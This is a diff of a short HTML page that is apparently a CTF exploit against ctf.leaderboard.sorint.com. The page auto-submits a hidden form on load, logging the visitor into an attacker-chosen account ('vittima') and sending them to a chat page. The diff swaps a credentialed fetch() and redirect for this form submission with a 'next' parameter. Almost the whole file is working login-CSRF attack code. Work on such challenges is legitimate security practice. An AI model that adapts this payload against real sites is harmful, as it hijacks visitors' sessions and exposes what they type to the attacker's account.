@@ -2,20 +2,12 @@
 <html>
 <body>
 <div class="message">x</div>
-<form id="f" method="POST" action="https://ctf.leaderboard.sorint.com/login" target="_self">
+<form id="f" method="POST" action="https://ctf.leaderboard.sorint.com/login?next=%2Fchat%2F47" target="_self">
   <input name="username" value="vittima">
   <input name="password" value="vittima">
 </form>
 <script>
-  fetch('https://ctf.leaderboard.sorint.com/login', {
-    method: 'POST',
-    credentials: 'include',
-    mode: 'no-cors',
-    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-    body: 'username=vittima&password=vittima'
-  }).then(() => {
-    window.location = 'https://ctf.leaderboard.sorint.com/chat/47';
-  });
+  document.getElementById('f').submit();
 </script>
 </body>
 </html>
